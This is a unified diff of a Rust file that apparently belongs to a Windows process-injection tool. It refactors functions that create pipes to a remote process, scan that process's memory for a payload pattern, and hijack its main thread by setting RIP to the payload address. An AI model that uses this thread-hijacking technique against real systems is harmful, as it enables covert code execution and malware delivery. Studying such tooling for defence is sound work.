@@ -23,7 +23,7 @@ pub struct Handle {
     pub h_std_in_write: HANDLE,
     pub h_std_out_read: HANDLE,
     pub h_std_out_write: HANDLE,
-    pub security_attr: SECURITY_ATTRIBUTES,
+    pub sa: SECURITY_ATTRIBUTES,
 }
 
 /// MemoryInfo store information about the process created
@@ -36,7 +36,7 @@ pub struct Handle {
 pub struct MemoryInfo {
     pub r_base_addr: usize,
     pub r_size: usize,
-    pub offset: usize,
+    pub payload_addr: usize,
     pub oldflag: PAGE_PROTECTION_FLAGS,
 }
 
@@ -53,11 +53,8 @@ pub fn get_args() -> Result<CString, NulError> {
         eprintln!("[-] Programme path is required");
     }
 
-    let result = CString::new(args[1].clone());
-    match result {
-        Ok(path) => Ok(path),
-        Err(e) => Err(e),
-    }
+    CString::new(args[1].clone())
+
 }
 
 /// Create the four pipes that are used for communication with remote process
@@ -112,7 +109,7 @@ pub fn create_pipe() -> Handle {
         h_std_in_write: h_std_in_w,
         h_std_out_read: h_std_out_r,
         h_std_out_write: h_std_out_w,
-        security_attr: security_attr,
+        sa: security_attr,
     };
 
     my_handle
@@ -207,21 +204,20 @@ pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
                         let index = read_memory_buffer
                             .windows(pattern.len())
                             .position(|window| window == pattern);
-                        match index {
-                            Some(idx) => {
+                        
+                            if let Some(idx) = index {
                                 let offset = current_addr + idx;
                                 println!("[+] Find pattern in memory at {:#x}", offset);
 
                                 let mem_info: MemoryInfo = MemoryInfo {
                                     r_base_addr: region_start,
                                     r_size: memory_info.RegionSize,
-                                    offset: offset,
+                                    payload_addr: offset,
                                     oldflag: memory_info.Protect,
                                 };
                                 return Some(mem_info);
                             }
-                            None => {}
-                        }
+
                     }
                     Err(e) => println!(
                         "[-] Failed to read process memory: {e}, @ {:#x}",
@@ -276,10 +272,12 @@ pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64) {
     println!("[*] Hijacking main thread...");
     let _ = unsafe { SuspendThread(ns_thread) };
 
-    let mut context: CONTEXT = CONTEXT::default();
-
     // init the context for retrieve all the register
-    context.ContextFlags = CONTEXT_FULL_AMD64;
+    let mut context: CONTEXT = CONTEXT {
+        ContextFlags: CONTEXT_FULL_AMD64,
+        ..Default::default()
+    };
+
     let result = unsafe { GetThreadContext(ns_thread, &mut context) };
     match result {
         Ok(_) => println!("[+] Successfully get thread context"),
@@ -292,7 +290,7 @@ pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64) {
     );
 
     // change rip pointer
-    let addr_payload: u64 = offset + 15 as u64;
+    let addr_payload: u64 = offset + 15_u64;
     context.Rip = addr_payload;
 
     // set the context
